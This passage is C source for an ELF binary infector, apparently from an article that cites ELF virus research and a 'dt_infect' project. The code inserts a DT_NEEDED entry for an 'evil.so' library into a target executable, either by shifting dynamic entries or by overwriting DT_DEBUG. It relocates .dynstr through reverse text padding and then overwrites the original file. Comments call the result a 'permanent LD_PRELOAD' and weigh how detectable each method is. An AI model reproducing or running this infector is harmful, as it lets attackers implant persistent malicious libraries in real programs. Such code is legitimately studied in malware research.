	elf_dynamic_entry_t d_entry;
	elf_dynamic_iterator_t d_iter;
	elf_error_t error;
	struct tmp_dtags {
		bool needed;
		uint64_t value;
		uint64_t tag;
		TAILQ_ENTRY(tmp_dtags) _linkage;
	};
	struct tmp_dtags *current;
	TAILQ_HEAD(, tmp_dtags) dtags_list;
	TAILQ_INIT(&dtags_list);

	if (calculate_new_dynentry_count(target, &dcount, &dpadsz) == false) {
		fprintf(stderr, "Failed to calculate padding size after dynamic section\n");
		return false;
	}
	if (dcount == 0) {
		fprintf(stderr, "Not enough room to shift dynamic entries forward"
		    ", falling back to overwriting DT_DEBUG with DT_NEEDED\n");
		use_debug_entry = true;
	} else if (dt_debug_method == true) {
		fprintf(stderr, "Forcing DT_DEBUG overwrite. This technique will not give\n"
		    "your injected shared library functions precedence over any other libraries\n"
		    "and will therefore require you to manually overwrite the .got.plt entries to\n"
		    "point at your custom shared library function(s)\n");
		use_debug_entry = true;
	}
	elf_dynamic_iterator_init(target, &d_iter);
	for (;;) {
		res = elf_dynamic_iterator_next(&d_iter, &d_entry);
		if (res == ELF_ITER_DONE)
			break;
		if (res == ELF_ITER_ERROR) {
			fprintf(stderr, "elf_dynamic_iterator_next failed\n");
			return false;
		}
		struct tmp_dtags *n = malloc(sizeof(*n));

		if (n == NULL) {
			perror("malloc");
			return false;
		}
		n->value = d_entry.value;
		n->tag = d_entry.tag;
		if (n->tag == DT_DEBUG)	{
			dt_debug_index = d_index;
		}
		TAILQ_INSERT_TAIL(&dtags_list, n, _linkage);
		d_index++;
	}

	/*
	 * In the following code we modify dynamic segment to look like this:
	 * Original: DT_NEEDED: "libc.so", DT_INIT: 0x4009f0, etc.
	 * Modified: DT_NEEDED: "evil.so", DT_NEEDED: "libc.so", DT_INIT: 0x4009f0, etc.
	 * Which acts like a permanent LD_PRELOAD.
	 * ...
	 * If there is no room to shift the dynamic entriess forward (Which there in
	 * general is enough space to add atleast several) then we fall back on a less
	 * elegant and easier to detect method where we overwrite DT_DEBUG and change
	 * it to a DT_NEEDED entry. This is easier to detect because of the fact that
	 * the linker always creates DT_NEEDED entries so that they are contiguous
	 * whereas in this case the DT_DEBUG that we overwrite is generally about 11
	 * entries after the last DT_NEEDED entry.
	 */

	index = 0;
	if (use_debug_entry == false) {
		d_entry.tag = DT_NEEDED;
		d_entry.value = evil_offset; /* Offset into .dynstr for "evil.so" */
		res = elf_dynamic_modify(target, 0, &d_entry, true, &error);
		if (res == false) {
			fprintf(stderr, "elf_dynamic_modify failed: %s\n",
			    elf_error_msg(&error));
			return false;
		}
		index = 1;
	}

	TAILQ_FOREACH(current, &dtags_list, _linkage) {
		if (use_debug_entry == true && current->tag == DT_DEBUG) {
			if (dt_debug_index == 0) {
				printf("Could not find DT_DEBUG entry, injection has failed\n");
				return false;
			}
			printf("%sOverwriting DT_DEBUG at index: %zu\n",
			    dcount == 0 ? "Falling back to " : "", dt_debug_index);
			d_entry.tag = DT_NEEDED;
			d_entry.value = evil_offset;
			res = elf_dynamic_modify(target, dt_debug_index, &d_entry, true, &error);
			if (res == false) {
				fprintf(stderr, "elf_dynamic_modify failed: %s\n",
				    elf_error_msg(&error));
				return false;
			}
			goto next;
		}
		if (current->tag == DT_STRTAB) {
			d_entry.tag = DT_STRTAB;
			d_entry.value = dynstr_vaddr;
			res = elf_dynamic_modify(target, index, &d_entry, true, &error);
			if (res == false) {
				fprintf(stderr, "elf_dynamic_modify failed: %s\n",
				   elf_error_msg(&error));
				return false;
			}
			printf("Modified d_entry.value of DT_STRTAB to: %lx (index: %zu)\n",
			    d_entry.value, index);
			goto next;
		}
#if 0
		printf("Updating dyn[%zu]\n", index);
#endif
		d_entry.tag = current->tag;
		d_entry.value = current->value;
		res = elf_dynamic_modify(target, index, &d_entry, true, &error);
		if (res == false) {
			fprintf(stderr, "elf_dynamic_modify failed: %s\n",
			    elf_error_msg(&error));
			return false;
		}
next:
		index++;
	}
	return true;
}

/*
 * This function will tell us how many new ElfN_Dyn entries
 * can be added to the dynamic segment, as there is often space
 * between .dynamic and the section following it.
 */
bool
calculate_new_dynentry_count(elfobj_t *target, uint64_t *count, uint64_t *size)
{
	elf_section_iterator_t s_iter;
	struct elf_section section;
	size_t len;
	size_t dynsz = elf_class(target) == elfclass32 ? sizeof(Elf32_Dyn) :
	    sizeof(Elf64_Dyn);
	uint64_t dyn_offset = 0;

	*count = 0;
	*size = 0;

	elf_section_iterator_init(target, &s_iter);
	while (elf_section_iterator_next(&s_iter, &section) == ELF_ITER_OK) {
		if (strcmp(section.name, ".dynamic") == 0) {
			dyn_offset = section.offset;
		} else if (dyn_offset > 0) {
			len = section.offset - dyn_offset;
			*size = len;
			*count = len / dynsz;
			return true;
		}
	}
	return false;
}

int main(int argc, char **argv)
{
	uint8_t *mem;
	elfobj_t so_obj;
	elfobj_t target;
	bool res, text_found = false;
	elf_segment_iterator_t p_iter;
	struct elf_segment segment;
	struct elf_section section, dynstr_shdr;
	elf_section_iterator_t s_iter;
	size_t paddingSize, o_dynstr_size, dynstr_size, ehdr_size, final_len;
	uint64_t old_base, new_base, n_dynstr_vaddr, evil_string_offset;
	elf_error_t error;
	char *evil_lib, *executable;
	int fd;
	ssize_t b;

	if (argc < 3) {
		printf("Usage: %s [-f] <lib.so> <target>\n", argv[0]);
		printf("-f	Force DT_DEBUG overwrite technique\n");
		exit(0);
	}
	if (argv[1][0] == '-' && argv[1][1] == 'f') {
		dt_debug_method = true;
		evil_lib = argv[2];
		executable = argv[3];
	} else {
		evil_lib = argv[1];
		executable = argv[2];
	}
	res = elf_open_object(executable, &target,
	    ELF_LOAD_F_STRICT|ELF_LOAD_F_MODIFY, &error);
	if (res == false) {
		fprintf(stderr, "failed to open %s: %s\n", executable, elf_error_msg(&error));
		exit(-1);
	}
	ehdr_size = elf_class(&target) == elfclass32 ?
	    sizeof(Elf32_Ehdr) : sizeof(Elf64_Ehdr);

	res = elf_section_by_name(&target, ".dynstr", &dynstr_shdr);
	if (res == false) {
		perror("failed to find section .dynstr\n");
		exit(-1);
	}
	paddingSize = PAGE_ALIGN_UP(dynstr_shdr.size);

	res = elf_segment_by_index(&target, PT_PHDR_INDEX, &segment);
	if (res == false) {
		fprintf(stderr, "Failed to find segment: %d\n", PT_PHDR_INDEX);
		goto done;
	}
	segment.offset += paddingSize;
	res = elf_segment_modify(&target, PT_PHDR_INDEX, &segment, &error);
	if (res == false) {
		fprintf(stderr, "elf_segment_modify failed: %s\n", elf_error_msg(&error));
		goto done;
	}
	res = elf_segment_by_index(&target, PT_INTERP_INDEX, &segment);
	if (res == false) {
		printf("Failed to find segment: %d\n", PT_INTERP_INDEX);
		goto done;
	}
	segment.offset += paddingSize;
	res = elf_segment_modify(&target, PT_INTERP_INDEX, &segment, &error);
	if (res == false) {
		printf("elf_segment_modify failed: %s\n", elf_error_msg(&error));
		goto done;
	}
	printf("Creating reverse text padding infection to store new .dynstr section\n");
	elf_segment_iterator_init(&target, &p_iter);
	while (elf_segment_iterator_next(&p_iter, &segment) == ELF_ITER_OK) {
		if (text_found == true) {
			segment.offset += paddingSize;
			res = elf_segment_modify(&target, p_iter.index - 1,
			    &segment, &error);
			if (res == false) {
				printf("elf_segment_modify failed: %s\n",
				    elf_error_msg(&error));
				goto done;
			}
		}
		if (segment.type == PT_LOAD && segment.offset == 0) {
			old_base = segment.vaddr;
			segment.vaddr -= paddingSize;
			segment.paddr -= paddingSize;
			segment.filesz += paddingSize;
			segment.memsz += paddingSize;
			new_base = segment.vaddr;
			text_found = true;
			res = elf_segment_modify(&target, p_iter.index - 1,
			    &segment, &error);
			if (res == false) {
				printf("elf_segment_modify failed: %s\n",
				    elf_error_msg(&error));
				goto done;
			}
		}
	}
	/* Adjust .dynstr so that it points to where the reverse
	 * text extension is; right after elf_hdr and right before
	 * the shifted forward phdr table.
	 * Adjust all other section offsets by paddingSize to shift
	 * forward beyond the injection site.
	 */
	elf_section_iterator_init(&target, &s_iter);
	while(elf_section_iterator_next(&s_iter, &section) == ELF_ITER_OK) {
		if (strcmp(section.name, ".dynstr") == 0) {
			printf("Updating .dynstr section\n");
			section.offset = ehdr_size;
			section.address = old_base - paddingSize;
			section.address += ehdr_size;
			n_dynstr_vaddr = section.address;
			evil_string_offset = section.size;
			o_dynstr_size = section.size;
			section.size += strlen(evil_lib) + 1;
			dynstr_size = section.size;
			res = elf_section_modify(&target, s_iter.index - 1,
			    &section, &error);
		} else {
			section.offset += paddingSize;
			res = elf_section_modify(&target, s_iter.index - 1,
			    &section, &error);
		}
	}
	elf_section_commit(&target);
	if (elf_class(&target) == elfclass32) {
		target.ehdr32->e_shoff += paddingSize;
		target.ehdr32->e_phoff += paddingSize;
	} else {
		target.ehdr64->e_shoff += paddingSize;
		target.ehdr64->e_phoff += paddingSize;
	}
	res = modify_dynamic_segment(&target, n_dynstr_vaddr, evil_string_offset);
	if (res == false) {
		fprintf(stderr, "modify_dynamic_segment failed\n");
		exit(EXIT_FAILURE);
	}
	/*
	 * Write out our new executable with new string table.
	 */
	fd = open(TMP, O_CREAT|O_WRONLY|O_TRUNC, S_IRWXU);
	if (fd < 0) {
		perror("open");
		exit(EXIT_FAILURE);
	}
	/*
	 * Write initial ELF file header
	 */
	b = write(fd, target.mem, ehdr_size);
	if (b < 0) {
		perror("write");
		exit(EXIT_FAILURE);
	}
	/*
	 * Write out our new .dynstr section into our padding space
	 */
	b = write(fd, elf_dynstr(&target), o_dynstr_size);
	if (b < 0) {
		perror("write");
		exit(EXIT_FAILURE);
	}
	b = write(fd, evil_lib, strlen(evil_lib) + 1);
	if (b < 0) {
		perror("write");
		exit(EXIT_FAILURE);
	}

	if ((b = lseek(fd, ehdr_size + paddingSize, SEEK_SET)) != ehdr_size + paddingSize) {
		perror("lseek");
		exit(EXIT_FAILURE);
	}
	mem = target.mem + ehdr_size;
	final_len = target.size - ehdr_size;
	b = write(fd, mem, final_len);
	if (b != final_len) {
		perror("write");
		exit(EXIT_FAILURE);
	}
done:
	elf_close_object(&target);
	rename(TMP, executable);
	printf("Successfully injected '%s' into target: '%s'. Make sure to move '%s'"
	    " into one of the shared object search paths, i.e. /lib/x86_64-gnu-linux/\n",
	    evil_lib, executable, evil_lib);
	exit(EXIT_SUCCESS);
}


[1] https://www.bitlackeys.org/secure_code_partitioning_2018.txt
[2] Book: Learning Linux binary analysis, chapter 4 'ELF Virus technology'
[3] UNIX ELF parasites and viruses http://83.133.184.251/virensimulation.org/lib/vsc01.html
[4] https://github.com/elfmaster/dsym_obfuscate
[5] http://83.133.184.251/virensimulation.org/lib/vrn01.html (Retaliation Virus)
[6] http://phrack.org/issues/61/8.html
[7] http://www.eresi-project.org
[8] https://github.com/elfmaster/dt_infect
[9] https://github.com/elfmaster/libelfmaster
[10] https://github.com/JonathanSalwan/ROPgadget
